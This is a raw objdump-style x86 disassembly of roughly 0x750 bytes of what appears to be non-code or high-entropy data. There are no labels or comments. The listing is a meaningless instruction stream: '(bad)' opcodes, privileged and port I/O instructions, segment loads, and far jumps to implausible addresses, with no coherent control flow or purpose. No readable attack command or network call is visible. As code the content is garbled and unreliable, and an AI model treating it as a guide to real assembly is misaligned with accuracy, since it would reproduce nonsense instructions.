  40f96a:	fs ss xchg ebp,eax
  40f96d:	mov    ebx,0xe9d3dffc
  40f972:	imul   esp,esp,0xb1277bfc
  40f978:	push   esi
  40f979:	mov    eax,DWORD PTR [eax+ebx*1]
  40f97c:	out    dx,eax
  40f97d:	dec    ebx
  40f97e:	aaa    
  40f97f:	ds jecxz 0x40f9c4
  40f982:	div    BYTE PTR [edi-0x5a3ba951]
  40f988:	cmp    ebx,DWORD PTR [esi]
  40f98a:	hlt    
  40f98b:	int3   
  40f98c:	mov    ebx,0x3a7cf939
  40f991:	inc    edi
  40f992:	fidivr DWORD PTR [ecx+edi*4]
  40f995:	xchg   esi,eax
  40f996:	inc    ecx
  40f997:	aad    0x0
  40f999:	cmp    BYTE PTR gs:[ecx+eiz*4-0x5b],0x62
  40f99f:	mov    cl,0xd
  40f9a1:	sbb    esi,edi
  40f9a3:	stos   BYTE PTR es:[edi],al
  40f9a4:	mov    edi,0x996df2d9
  40f9a9:	and    al,0x57
  40f9ab:	(bad)  [edx+ebp*1-0x29]
  40f9af:	das    
  40f9b0:	fist   WORD PTR [eax+0x3afb8158]
  40f9b6:	xchg   ebp,eax
  40f9b7:	scas   eax,DWORD PTR es:[edi]
  40f9b8:	sbb    BYTE PTR [ecx+0x370d6b6e],dl
  40f9be:	sar    DWORD PTR [ebp+0x22195073],1
  40f9c4:	int    0x38
  40f9c6:	sub    eax,DWORD PTR [edx]
  40f9c8:	rcpps  xmm2,xmm6
  40f9cb:	scas   al,BYTE PTR es:[edi]
  40f9cc:	push   es
  40f9cd:	push   0x9df90ccf
  40f9d2:	ret    
  40f9d3:	push   ecx
  40f9d4:	adc    al,0x26
  40f9d6:	or     ah,BYTE PTR [ebx+eiz*2-0x54]
  40f9da:	fisttp DWORD PTR ds:0xa958e8e5
  40f9e0:	fwait
  40f9e1:	aam    0x2a
  40f9e3:	adc    bl,BYTE PTR [edx+eiz*8+0x329fd198]
  40f9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9eb:	jle    0x40fa5e
  40f9ed:	mov    dl,BYTE PTR [ebx-0xc]
  40f9f0:	(bad)  
  40f9f1:	mov    al,ds:0xb55fcc27
  40f9f6:	mov    edx,0xaf45c71b
  40f9fb:	xlat   BYTE PTR ds:[ebx]
  40f9fc:	dec    esi
  40f9fd:	lahf   
  40f9fe:	test   DWORD PTR [edx+0x2afb351f],ebx
  40fa04:	icebp  
  40fa05:	(bad)  
  40fa06:	(bad)  
  40fa08:	adc    eax,0xb1442490
  40fa0d:	shr    BYTE PTR [eax],1
  40fa0f:	inc    edi
  40fa10:	stc    
  40fa11:	retf   0xa098
  40fa14:	repz add bh,ah
  40fa17:	ss xor eax,0x95088315
  40fa1d:	sub    BYTE PTR [ebx],ch
  40fa1f:	xor    eax,0xa48a942d
  40fa24:	shr    BYTE PTR [esp+ecx*8],0xfb
  40fa28:	aad    0x2f
  40fa2a:	scas   al,BYTE PTR es:[edi]
  40fa2b:	outs   dx,DWORD PTR ds:[esi]
  40fa2c:	cdq    
  40fa2d:	mov    BYTE PTR [esi-0x65],bl
  40fa30:	fstp   DWORD PTR [ebx]
  40fa32:	sbb    al,0xbf
  40fa34:	leave  
  40fa35:	fnstcw WORD PTR [eax+eiz*4]
  40fa38:	ins    DWORD PTR es:[edi],dx
  40fa39:	jbe    0x40fa82
  40fa3b:	icebp  
  40fa3c:	mov    ss,WORD PTR [ecx-0x66eea7ce]
  40fa42:	mov    esp,0xc936df6a
  40fa47:	fsubr  DWORD PTR [ecx]
  40fa49:	push   esp
  40fa4a:	std    
  40fa4b:	mov    bh,0x86
  40fa4d:	inc    ebx
  40fa4e:	add    al,0x3e
  40fa50:	jo     0x40fa32
  40fa52:	xchg   ebx,eax
  40fa53:	gs pop ecx
  40fa56:	cmp    al,BYTE PTR [ecx+0x613fa924]
  40fa5c:	push   ebx
  40fa5d:	inc    ebx
  40fa5e:	xchg   ecx,eax
  40fa5f:	mov    edx,0x7f0628d8
  40fa64:	pop    esp
  40fa65:	repnz push ss
  40fa67:	aad    0x4d
  40fa69:	inc    esp
  40fa6a:	push   edx
  40fa6b:	(bad)  
  40fa6c:	fucom  st(1)
  40fa6e:	outs   dx,BYTE PTR ds:[esi]
  40fa6f:	mov    al,0x9e
  40fa71:	cs inc esp
  40fa73:	sbb    BYTE PTR [ebx+0x6696096d],dh
  40fa79:	push   ss
  40fa7a:	(bad)  
  40fa7b:	in     eax,dx
  40fa7c:	push   ebx
  40fa7d:	stc    
  40fa7e:	adc    BYTE PTR [edx+0x6a15ea7b],bl
  40fa84:	push   0x1920db79
  40fa89:	stos   DWORD PTR es:[edi],eax
  40fa8a:	cld    
  40fa8b:	pop    eax
  40fa8c:	mov    eax,DWORD PTR [esp+edx*2-0xe0c2e74]
  40fa93:	pop    esp
  40fa94:	push   ecx
  40fa95:	mov    eax,ds:0x9647f9a8
  40fa9a:	(bad)  
  40fa9b:	je     0x40fa98
  40fa9d:	retf   
  40fa9e:	js     0x40fb16
  40faa0:	mov    edx,DWORD PTR [esi+0x38b3e1c7]
  40faa6:	xchg   esi,eax
  40faa7:	push   cs
  40faa8:	and    DWORD PTR [esi-0x63],0xffffff92
  40faac:	pop    edx
  40faad:	das    
  40faae:	daa    
  40faaf:	dec    ebp
  40fab0:	mov    edi,0x57ea0550
  40fab5:	or     DWORD PTR [eax],esp
  40fab7:	shr    bh,cl
  40fab9:	push   es
  40faba:	ja     0x40fa79
  40fabc:	out    dx,al
  40fabd:	iret   
  40fabe:	jo     0x40fb36
  40fac0:	es mov eax,0xd41ce30f
  40fac6:	or     eax,DWORD PTR [eax+0x6f]
  40fac9:	les    eax,FWORD PTR [esi-0x6]
  40facc:	adc    al,0x3b
  40face:	sti    
  40facf:	and    al,0xd
  40fad1:	(bad)  
  40fad2:	in     eax,dx
  40fad3:	cdq    
  40fad4:	add    BYTE PTR [eax-0x6e],ch
  40fad7:	jp     0x40fab4
  40fad9:	mov    al,0xeb
  40fadb:	cmc    
  40fadc:	bnd jmp 0x76312955
  40fae2:	stos   BYTE PTR es:[edi],al
  40fae3:	mov    BYTE PTR [ebx+0x74],bl
  40fae6:	sbb    eax,0x1ac868aa
  40faeb:	sbb    al,0xad
  40faed:	sub    dl,al
  40faef:	pop    ebx
  40faf0:	jne    0x40fa8e
  40faf2:	fisttp QWORD PTR [edi-0x61df5e80]
  40faf8:	inc    edx
  40faf9:	adc    al,0xae
  40fafc:	loope  0x40fb6c
  40fafe:	loop   0x40fab8
  40fb00:	add    dh,ch
  40fb02:	outs   dx,BYTE PTR ds:[esi]
  40fb03:	cmp    eax,0xc2712b7
  40fb08:	cld    
  40fb09:	jns    0x40fab1
  40fb0b:	xchg   DWORD PTR [esi+0x53f6182e],edx
  40fb11:	sub    edx,ebx
  40fb13:	mov    al,0xbb
  40fb15:	dec    ebx
  40fb16:	adc    al,0xef
  40fb18:	mov    al,0x6
  40fb1a:	dec    ebx
  40fb1b:	scas   al,BYTE PTR es:[edi]
  40fb1c:	jbe    0x40fb6e
  40fb1e:	daa    
  40fb1f:	mov    edx,0x5f0838a9
  40fb24:	fsubp  st(3),st
  40fb26:	push   esp
  40fb27:	repz jl 0x40faf0
  40fb2a:	xchg   ecx,eax
  40fb2b:	adc    al,0xde
  40fb2d:	sbb    eax,0xe425414f
  40fb32:	mov    dl,0xbe
  40fb34:	jle    0x40fadf
  40fb36:	push   ebx
  40fb37:	or     eax,0x42b99c91
  40fb3c:	mov    ds:0xcd638975,al
  40fb41:	pushf  
  40fb42:	xor    BYTE PTR [ebx-0x73],bh
  40fb45:	cwde   
  40fb46:	inc    ebp
  40fb47:	bound  edi,QWORD PTR [edx-0x3e4a6403]
  40fb4d:	sbb    edi,ebp
  40fb4f:	rol    BYTE PTR [edx-0x285ed407],1
  40fb55:	ud0    edi,DWORD PTR [edi+0x211fd21b]
  40fb5c:	icebp  
  40fb5d:	mov    bl,0x26
  40fb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb60:	mov    ds:0x66f868d8,al
  40fb65:	pop    es
  40fb66:	icebp  
  40fb67:	and    eax,0x26e13228
  40fb6c:	push   ebx
  40fb6d:	ret    0x8036
  40fb70:	arpl   WORD PTR [eax],di
  40fb72:	inc    esp
  40fb73:	push   eax
  40fb74:	xchg   ebp,eax
  40fb75:	lds    esp,FWORD PTR [esi-0x46ae343]
  40fb7b:	ds hlt 
  40fb7d:	mov    esi,0xce6d39db
  40fb82:	sub    BYTE PTR cs:[eax-0x49],bh
  40fb86:	(bad)  
  40fb87:	icebp  
  40fb88:	(bad)
  40fb8b:	sti    
  40fb8c:	cmove  esp,DWORD PTR [eax+0x1e0d90c1]
  40fb93:	div    bl
  40fb95:	add    DWORD PTR [bx+di-0x71],esi
  40fb99:	dec    ecx
  40fb9a:	call   0xcefaee55
  40fb9f:	mov    WORD PTR [ecx-0x20],?
  40fba2:	pusha  
  40fba3:	ja     0x40fbcf
  40fba5:	arpl   WORD PTR [eax],bp
  40fba7:	mov    cl,0x41
  40fba9:	cmp    eax,0xc62f35e3
  40fbae:	iret   
  40fbaf:	xlat   BYTE PTR ds:[ebx]
  40fbb0:	aaa    
  40fbb1:	mov    WORD PTR [edi-0x3f95fc1d],gs
  40fbb7:	dec    ebx
  40fbb8:	sub    edx,edx
  40fbba:	xchg   ebx,eax
  40fbbb:	fsubr  QWORD PTR [eax*8+0x54d2b63d]
  40fbc2:	enter  0x221b,0x2
  40fbc6:	clc    
  40fbc7:	call   0x52928f76
  40fbcc:	fnstcw WORD PTR [edi+0xf]
  40fbcf:	clc    
  40fbd0:	lods   al,BYTE PTR ds:[esi]
  40fbd1:	pop    ebx
  40fbd2:	xor    DWORD PTR [esi-0xf],edi
  40fbd5:	pop    ecx
  40fbd6:	shr    BYTE PTR [edx+0x53f206bf],1
  40fbdc:	mov    edx,DWORD PTR [edx+0x5c925e73]
  40fbe2:	xor    bh,BYTE PTR [edi+ebp*2-0x37]
  40fbe6:	cdq    
  40fbe7:	jns    0x40fbb9
  40fbe9:	mov    ecx,0xfbeced5b
  40fbee:	mov    ebx,0xd224b202
  40fbf3:	in     al,0x38
  40fbf5:	imul   edx,DWORD PTR [edi],0x39f462a6
  40fbfb:	mov    ecx,0x59645128
  40fc00:	add    eax,0x38fef686
  40fc05:	pop    ebx
  40fc06:	push   0x3d46461b
  40fc0b:	imul   edi,ebx,0x2f
  40fc0e:	jno    0x40fc73
  40fc10:	in     al,dx
  40fc11:	ficomp DWORD PTR [edx-0x7c19f057]
  40fc17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc18:	fsubr  QWORD PTR [ebx-0x525b7fcd]
  40fc1e:	jae    0x40fbec
  40fc20:	stc    
  40fc21:	xchg   esp,eax
  40fc22:	xlat   BYTE PTR ds:[ebx]
  40fc23:	push   eax
  40fc24:	add    eax,0x637d881c
  40fc29:	xor    al,0x80
  40fc2b:	add    eax,0x7699311f
  40fc30:	dec    esp
  40fc31:	pop    ss
  40fc32:	mov    WORD PTR [eax-0x19],ss
  40fc35:	pop    ebp
  40fc36:	add    eax,0x1b946820
  40fc3b:	jae    0x40fc7d
  40fc3d:	xchg   esp,eax
  40fc3e:	loope  0x40fbe9
  40fc40:	ret    
  40fc41:	outs   dx,BYTE PTR ds:[esi]
  40fc42:	xor    esp,DWORD PTR [edx]
  40fc44:	icebp  
  40fc45:	outs   dx,BYTE PTR ds:[esi]
  40fc46:	(bad)  
  40fc47:	mov    ah,0xf5
  40fc49:	loope  0x40fbd4
  40fc4b:	mov    esp,0x8d0de049
  40fc50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc51:	dec    edi
  40fc52:	cmp    al,ch
  40fc54:	cmp    al,0x45
  40fc56:	aad    0x51
  40fc58:	sbb    ch,bl
  40fc5a:	cli    
  40fc5b:	jecxz  0x40fc77
  40fc5d:	pxor   mm7,QWORD PTR [eax+edx*1-0x530d874c]
  40fc65:	into   
  40fc66:	test   al,0x99
  40fc68:	int3   
  40fc69:	sbb    eax,0x250b5cad
  40fc6e:	out    0xe0,al
  40fc70:	(bad)  
  40fc71:	sbb    edx,ecx
  40fc73:	ror    ecx,cl
  40fc75:	or     dh,dh
  40fc77:	add    esi,DWORD PTR [eax]
  40fc79:	pop    ds
  40fc7a:	into   
  40fc7b:	xchg   DWORD PTR [esp+ebx*8+0x69],eax
  40fc7f:	jmp    0x40fcfa
  40fc81:	push   ss
  40fc82:	inc    eax
  40fc83:	jno    0x40fc54
  40fc85:	jp     0x40fc41
  40fc87:	pop    ebx
  40fc88:	int    0xbc
  40fc8a:	xor    DWORD PTR [ebx],esp
  40fc8c:	push   ecx
  40fc8d:	xchg   DWORD PTR [esi-0x2e],esp
  40fc90:	xor    ebx,DWORD PTR [ebp+0x3962a479]
  40fc96:	lea    edi,[esi+edi*4]
  40fc99:	xchg   esp,eax
  40fc9a:	jne    0x40fc2b
  40fc9c:	xlat   BYTE PTR ds:[ebx]
  40fc9d:	push   ebp
  40fc9e:	dec    eax
  40fc9f:	pop    ecx
  40fca0:	add    al,0x92
  40fca2:	mov    dh,0xb1
  40fca4:	cli    
  40fca5:	les    esp,FWORD PTR [edx+0x76]
  40fca8:	inc    eax
  40fca9:	cmp    esi,DWORD PTR [ebp-0x6]
  40fcac:	xchg   ebp,eax
  40fcae:	mov    eax,0x4a860adf
  40fcb3:	cmp    eax,0x84fe92a7
  40fcb8:	push   0xffffffd8
  40fcba:	ins    BYTE PTR es:[edi],dx
  40fcbb:	sub    al,0x98
  40fcbd:	jae    0x40fca1
  40fcbf:	out    dx,al
  40fcc0:	shl    dh,0x1f
  40fcc3:	mov    eax,0xf79ab965
  40fcc8:	push   0xd07fafd
  40fccd:	pushf  
  40fcce:	and    DWORD PTR [eax+0x4a1d86dd],ebx
  40fcd4:	lea    ebp,[ebx-0x7e]
  40fcd7:	jecxz  0x40fd54
  40fcd9:	add    esi,DWORD PTR [edx-0x48]
  40fcdc:	fnstenv [esi+edi*1+0x54]
  40fce0:	or     BYTE PTR [ebx+0x52],dl
  40fce3:	xor    ebp,DWORD PTR [edi+0x51]
  40fce6:	push   ebp
  40fce7:	sbb    DWORD PTR [ecx+0x69],ebp
  40fcea:	inc    ebx
  40fceb:	push   ebx
  40fcec:	mov    eax,0x474c1979
  40fcf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf2:	repz scas al,BYTE PTR es:[edi]
  40fcf4:	push   esp
  40fcf5:	push   esi
  40fcf6:	cmp    ch,BYTE PTR [edx+0x13560ca6]
  40fcfc:	adc    ch,BYTE PTR [ebx]
  40fcfe:	sbb    edx,DWORD PTR [edx-0x68]
  40fd01:	addr16 (bad) 
  40fd04:	out    0xfd,al
  40fd06:	lods   eax,DWORD PTR ds:[esi]
  40fd07:	jno    0x40fcf8
  40fd09:	inc    edi
  40fd0a:	out    dx,al
  40fd0b:	mov    BYTE PTR [ebx-0x7d],cl
  40fd0e:	cmp    DWORD PTR [edx+ecx*8+0x72],edi
  40fd12:	cmc    
  40fd13:	scas   eax,DWORD PTR es:[edi]
  40fd14:	loop   0x40fc98
  40fd16:	fmul   DWORD PTR [esi-0x6c69a90c]
  40fd1c:	mov    edi,0x61b52e32
  40fd21:	daa    
  40fd22:	xor    BYTE PTR [ebp+0x71],ch
  40fd25:	xchg   ecx,eax
  40fd26:	xor    bh,BYTE PTR [eax-0x720097ce]
  40fd2c:	(bad)  
  40fd2e:	out    dx,eax
  40fd2f:	ins    BYTE PTR es:[edi],dx
  40fd30:	ins    BYTE PTR es:[edi],dx
  40fd31:	scas   al,BYTE PTR es:[edi]
  40fd32:	in     al,0xa1
  40fd34:	out    dx,al
  40fd35:	pop    ss
  40fd36:	es imul esi,esi,0xffffffb9
  40fd3a:	(bad)  
  40fd3b:	pavgw  mm6,QWORD PTR [edx+0x2a]
  40fd3f:	jae    0x40fd57
  40fd41:	mov    al,0x65
  40fd43:	push   ebx
  40fd44:	clc    
  40fd45:	push   edi
  40fd46:	push   edi
  40fd47:	mov    ch,0x6
  40fd49:	loopne 0x40fd37
  40fd4b:	mov    al,0x40
  40fd4d:	inc    ebp
  40fd4e:	mov    ds:0xa50b3e66,eax
  40fd53:	xchg   edi,eax
  40fd54:	mov    ds:0xb0edd028,eax
  40fd59:	je     0x40fce2
  40fd5b:	push   0xdbe9a213
  40fd60:	aas    
  40fd61:	or     eax,0x4c191a80
  40fd66:	add    eax,0xd9ccfd03
  40fd6b:	in     al,dx
  40fd6c:	loope  0x40fd1e
  40fd6e:	aas    
  40fd6f:	sbb    al,0xc4
  40fd71:	arpl   WORD PTR [eax+edi*1-0x636dc98d],di
  40fd78:	repz fwait
  40fd7a:	outs   dx,DWORD PTR ds:[esi]
  40fd7b:	(bad)  
  40fd7c:	mov    ds:0x86d60e92,al
  40fd81:	fwait
  40fd82:	dec    ebp
  40fd83:	sub    edx,DWORD PTR [ebp+0x228a96ee]
  40fd89:	nop
  40fd8a:	ss fwait
  40fd8c:	scas   al,BYTE PTR es:[edi]
  40fd8d:	int    0xb3
  40fd8f:	xchg   edi,eax
  40fd90:	imul   ebp,DWORD PTR [edi],0x6f4e2d99
  40fd96:	cmc    
  40fd97:	shr    BYTE PTR [ecx-0xd],1
  40fd9a:	pop    esi
  40fd9b:	in     al,0xe
  40fd9d:	sbb    eax,0x8b998374
  40fda2:	xchg   ebp,eax
  40fda3:	fnstcw WORD PTR [esi]
  40fda5:	jl     0x40fdb1
  40fda7:	out    dx,eax
  40fda8:	push   eax
  40fda9:	aas    
  40fdaa:	xchg   esi,eax
  40fdab:	stos   DWORD PTR es:[edi],eax
  40fdac:	les    ebx,FWORD PTR [edx-0x447cea62]
  40fdb2:	jmp    0x95fe385f
  40fdb7:	test   eax,0xf63471f
  40fdbc:	mov    es,edx
  40fdbe:	jne    0x40fe0a
  40fdc0:	mov    edx,0x14d66d58
  40fdc5:	ret    0x814f
  40fdc8:	pop    ds
  40fdc9:	rcr    DWORD PTR [ecx],cl
  40fdcb:	dec    ebx
  40fdcc:	jbe    0x40fda8
  40fdce:	test   al,0x10
  40fdd0:	test   bl,al
  40fdd2:	xchg   esp,eax
  40fdd3:	jmp    0x4e03270c
  40fdd8:	jb     0x40fde7
  40fdda:	dec    eax
  40fddb:	push   ebp
  40fddc:	push   ebp
  40fddd:	jecxz  0x40fdee
  40fddf:	xor    al,0x72
  40fde1:	inc    edi
  40fde2:	fisub  WORD PTR [ebx-0x7d]
  40fde5:	xchg   ch,al
  40fde7:	push   ss
  40fde8:	(bad)  
  40fde9:	cmp    esi,esi
  40fdeb:	idiv   BYTE PTR [esi-0x19]
  40fdee:	(bad)  
  40fdef:	into   
  40fdf0:	repnz sub al,0x2d
  40fdf3:	adc    bl,BYTE PTR [eax]
  40fdf5:	mov    cl,0xd9
  40fdf7:	mov    al,0xeb
  40fdf9:	push   esi
  40fdfa:	adc    DWORD PTR [edx-0x7e4d24ee],0xb730ab1d
  40fe04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe05:	mov    bh,0x10
  40fe07:	xchg   ecx,eax
  40fe08:	fidiv  DWORD PTR [esi-0x2fa7f19e]
  40fe0e:	mov    ah,0x1
  40fe10:	adc    dh,BYTE PTR [ecx+edx*1+0x71]
  40fe14:	push   ebp
  40fe15:	adc    eax,0x96109296
  40fe1a:	jg     0x40fdfb
  40fe1c:	push   0x80a247c1
  40fe21:	cmp    al,0xca
  40fe23:	mov    edx,DWORD PTR [edx+0x26]
  40fe26:	or     BYTE PTR [edi+0x47],cl
  40fe29:	pop    es
  40fe2a:	push   0xffffffed
  40fe2c:	or     ecx,DWORD PTR [eax]
  40fe2e:	pushf  
  40fe2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe30:	adc    ch,BYTE PTR [ebp-0x75f7f743]
  40fe36:	sub    DWORD PTR ds:[edi-0x39],0xed2d0bf0
  40fe3e:	or     esp,DWORD PTR [ecx]
  40fe40:	cs loop 0x40fe35
  40fe43:	adc    al,0x36
  40fe45:	or     edi,ebp
  40fe47:	pop    esp
  40fe48:	popf   
  40fe49:	ds mov ch,0xad
  40fe4c:	and    eax,0xe61004b7
  40fe51:	mov    esi,0x9c27d546
  40fe56:	sbb    al,0x8f
  40fe58:	fs inc esp
  40fe5a:	lds    edi,FWORD PTR [edi-0x5b815535]
  40fe60:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fe62:	enter  0x49c4,0x11
  40fe66:	loop   0x40fe0e
  40fe68:	xchg   ecx,eax
  40fe69:	pop    es
  40fe6a:	ficom  DWORD PTR [ebx]
  40fe6c:	jno    0x40fdff
  40fe6e:	jnp    0x40fe90
  40fe70:	fsubr  DWORD PTR [esi-0x13694785]
  40fe76:	aas    
  40fe77:	popf   
  40fe78:	push   cs
  40fe79:	adc    DWORD PTR [edx-0x5363b111],ecx
  40fe7f:	mov    ebp,0xca9e91c
  40fe84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe85:	pop    ds
  40fe86:	and    BYTE PTR [ecx],ah
  40fe88:	ret    
  40fe89:	pushf  
  40fe8a:	dec    ebx
  40fe8b:	add    al,0x4c
  40fe8d:	jl     0x40ff08
  40fe8f:	mov    BYTE PTR [ecx-0x42],0x36
  40fe93:	mov    bh,0xf3
  40fe95:	jnp    0x40fe89
  40fe97:	ret    0xfd8f
  40fe9a:	dec    eax
  40fe9b:	call   0x1b4a76fc
  40fea0:	mov    bl,0xdb
  40fea2:	aad    0xde
  40fea4:	gs inc esp
  40fea6:	jmp    0xa1a4:0x718a894a
  40fead:	push   0x54
  40feaf:	mov    ecx,0x5d05543c
  40feb4:	sub    bl,BYTE PTR [edi-0x2d]
  40feb7:	es sahf 
  40feb9:	mov    BYTE PTR [edi],dh
  40febb:	mov    esp,0xa4db937e
  40fec0:	out    dx,al
  40fec1:	pop    ebx
  40fec2:	adc    al,0xcb
  40fec4:	shl    eax,1
  40fec6:	cmp    BYTE PTR [ebx+0x4d],0x1c
  40feca:	push   0x7b
  40fecc:	sub    esi,eax
  40fece:	push   edx
  40fecf:	loop   0x40fe5e
  40fed1:	inc    ebp
  40fed2:	or     al,0x5d
  40fed4:	pushf  
  40fed5:	int3   
  40fed6:	pop    esp
  40fed7:	not    DWORD PTR [esi-0x61]
  40feda:	or     eax,0x69518d33
  40fedf:	jae    0x40ff2d
  40fee1:	adc    BYTE PTR [edi+0x5098cdfd],bh
  40fee7:	and    DWORD PTR [ecx+0x0],0x27
  40feeb:	mov    ah,0x85
  40feed:	cmp    BYTE PTR [edx],al
  40feef:	adc    edi,DWORD PTR [edi+0x78]
  40fef2:	adc    ecx,ebp
  40fef4:	push   0x3f
  40fef6:	cdq    
  40fef7:	retf   0xde3f
  40fefa:	pop    eax
  40fefb:	pop    ss
  40fefc:	pop    ds
  40fefd:	and    eax,0x151c347a
  40ff02:	jp     0x40ff20
  40ff04:	jge    0x40ff5d
  40ff06:	adc    cl,cl
  40ff08:	cmp    al,0x5e
  40ff0a:	ret    0xf4c
  40ff0d:	mov    BYTE PTR [edi+0x38],bh
  40ff10:	pop    ebx
  40ff11:	sub    esp,DWORD PTR [edi-0x49754b6e]
  40ff17:	fist   DWORD PTR [ecx+ecx*2]
  40ff1a:	xchg   esi,eax
  40ff1b:	push   es
  40ff1c:	push   ebx
  40ff1d:	or     DWORD PTR [eax+0x1c],edx
  40ff20:	push   ds
  40ff21:	(bad)  
  40ff22:	sti    
  40ff23:	xchg   ecx,eax
  40ff24:	pop    esp
  40ff25:	(bad)  
  40ff26:	jo     0x40fed7
  40ff28:	dec    ebp
  40ff29:	dec    edi
  40ff2a:	sar    bl,0xc7
  40ff2d:	add    eax,0x639b9de6
  40ff32:	fcomi  st,st(5)
  40ff34:	and    al,0xf8
  40ff36:	pop    es
  40ff37:	aas    
  40ff38:	mov    ds:0xd0df5637,eax
  40ff3d:	mov    ch,0x1f
  40ff3f:	jno    0x40ff24
  40ff41:	aas    
  40ff42:	or     eax,0x8d5771a5
  40ff47:	adc    BYTE PTR [edi+0x2811f617],bl
  40ff4d:	adc    al,ch
  40ff4f:	jp     0x40ff1a
  40ff51:	jecxz  0x40ff81
  40ff53:	inc    ecx
  40ff54:	arpl   WORD PTR [ebp+0x58],di
  40ff57:	jns    0x40fef2
  40ff59:	sbb    eax,0x35c0298d
  40ff5e:	xor    eax,0xec9e4943
  40ff63:	push   esi
  40ff64:	(bad)  
  40ff65:	xlat   BYTE PTR ds:[ebx]
  40ff66:	test   BYTE PTR [edi+esi*8+0x73],al
  40ff6a:	jnp    0x40ffa6
  40ff6c:	imul   eax,ebx,0xffffffb9
  40ff6f:	mov    ebp,0xd53527c6
  40ff74:	cmp    al,0x36
  40ff76:	jne    0x40ffae
  40ff78:	repnz loope 0x40ff3d
  40ff7b:	shl    BYTE PTR [edx-0x280d818c],1
  40ff81:	cwde   
  40ff82:	pop    ds
  40ff83:	sub    al,0x40
  40ff85:	sbb    DWORD PTR [ebp+0x6d],ebx
  40ff88:	add    eax,0xd7f1ef95
  40ff8d:	jns    0x40ffc1
  40ff8f:	shl    DWORD PTR [ecx+0x3e287d7d],1
  40ff95:	loopne 0x40ffc1
  40ff97:	xchg   ebx,eax
  40ff98:	pop    edi
  40ff99:	repz retf 
  40ff9b:	ins    DWORD PTR es:[edi],dx
  40ff9c:	xchg   esi,eax
  40ff9d:	js     0x410007
  40ff9f:	sbb    ah,BYTE PTR [edi-0x19]
  40ffa2:	das    
  40ffa3:	aad    0x9e
  40ffa5:	mov    cs,esi
  40ffa7:	cmp    eax,0x5e7d55e6
  40ffac:	jae    0x40ff8b
  40ffae:	cdq    
  40ffaf:	push   ds
  40ffb0:	stc    
  40ffb1:	ror    DWORD PTR [ebp+esi*1+0x20],cl
  40ffb5:	push   esi
  40ffb6:	lods   al,BYTE PTR ds:[esi]
  40ffb7:	mov    DWORD PTR [edi-0x71983997],eax
  40ffbd:	sbb    bl,bh
  40ffbf:	dec    esp
  40ffc0:	xor    BYTE PTR [ebp-0x3ad13a22],0xcc
  40ffc7:	popf   
  40ffc8:	push   ebp
  40ffc9:	cmp    eax,0xc8f866fb
  40ffce:	jbe    0x41004b
  40ffd0:	in     al,dx
  40ffd1:	movhps QWORD PTR [eax+0x44],xmm4
  40ffd5:	jg     0x41003c
  40ffd7:	inc    ecx
  40ffd8:	jl     0x41000d
  40ffda:	ret    0xe051
  40ffdd:	mov    ebx,0xbd83b529
  40ffe2:	adc    BYTE PTR [eax],dh
  40ffe4:	lds    esi,FWORD PTR [edi+0x1e]
  40ffe7:	xchg   DWORD PTR [ecx+0x24],esi
  40ffea:	in     al,dx
  40ffeb:	pop    ebp
  40ffec:	push   edi
  40ffed:	in     al,dx
  40ffee:	jmp    0x7dcb0247
  40fff3:	add    eax,0x613c471e
  40fff8:	repz jnp 0x41007a
  40fffb:	cwde   
  40fffc:	fwait
  40fffd:	or     eax,0x13e784dd
  410002:	push   ss
  410003:	mov    ebx,0x3cc031fb
  410008:	adc    ebx,DWORD PTR [edi+0x2c]
  41000b:	xor    eax,0x7ee4dcdd
  410010:	scas   eax,DWORD PTR es:[edi]
  410011:	sbb    DWORD PTR [eax-0x1e66fc25],eax
  410017:	iret   
  410018:	xchg   esi,eax
  410019:	fwait
  41001a:	pop    ss
  41001b:	arpl   WORD PTR [edx+0xf],sp
  41001e:	xchg   ebx,eax
  41001f:	mov    eax,ds:0xaf03ac5e
  410024:	fmul   DWORD PTR cs:[edx]
  410027:	inc    edi
  410028:	arpl   bx,si
  41002a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002b:	xor    al,0x6d
  41002d:	stos   BYTE PTR es:[edi],al
  41002e:	xchg   DWORD PTR [edi+eax*1],ebp
  410031:	es hlt 
  410033:	shl    ebp,1
  410035:	adc    eax,0xc6f1d44e
  41003a:	mov    fs,WORD PTR [edx-0x4cd0cb50]
  410040:	sbb    eax,DWORD PTR [esi+eax*4+0x4f]
  410044:	cwde   
  410045:	pop    es
  410046:	js     0x40ffce
  410048:	add    bl,ch
  41004a:	iret   
  41004b:	jl     0x410023
  41004d:	mov    ah,al
  41004f:	jp     0x410008
  410051:	pop    eax
  410052:	cwde   
  410053:	shl    ch,1
  410055:	fsubr  st,st(0)
  410057:	je     0x41001e
  410059:	jg     0x410070
  41005b:	lds    edi,FWORD PTR [ebp-0x6cefc229]
  410061:	repz xor al,0xda
  410064:	jmp    0x410010
  410066:	fcomp  QWORD PTR [ebx]
  410068:	cmp    ah,bh
  41006a:	(bad)  
  41006b:	xor    BYTE PTR [ecx],bh
  41006d:	or     edi,ecx
  41006f:	inc    ebp
  410070:	sub    DWORD PTR [eax],esi
  410072:	jno    0x4100bb
  410074:	xor    DWORD PTR [ecx],edi
  410076:	cmp    ch,BYTE PTR [esp+ebx*8]
  410079:	pop    edx
  41007a:	xor    ch,dh
  41007c:	addr16 ret 
  41007e:	inc    esp
  41007f:	xchg   edx,eax
  410080:	pop    esi
  410081:	jno    0x410076
  410083:	inc    edi
  410084:	mov    bh,0xf7
  410086:	aad    0xa7
  410088:	sub    al,0x1f
  41008a:	pop    ds
  41008b:	arpl   di,bp
  41008d:	cmc    
  41008e:	imul   ecx,DWORD PTR [esi-0x70c68fe1],0x50e14a51
  410098:	add    ecx,0xffffff92
  41009b:	nop
  41009c:	call   0xe37b:0xb048ed66
  4100a3:	jno    0x410039
  4100a5:	push   edx
  4100a6:	sbb    ecx,DWORD PTR [edx+0x47e065ac]
  4100ac:	popa   
  4100ad:	jbe    0x410077
  4100af:	xlat   BYTE PTR ds:[ebx]
  4100b0:	fwait
  4100b1:	out    dx,ax
  4100b3:	add    eax,0x2020a20e
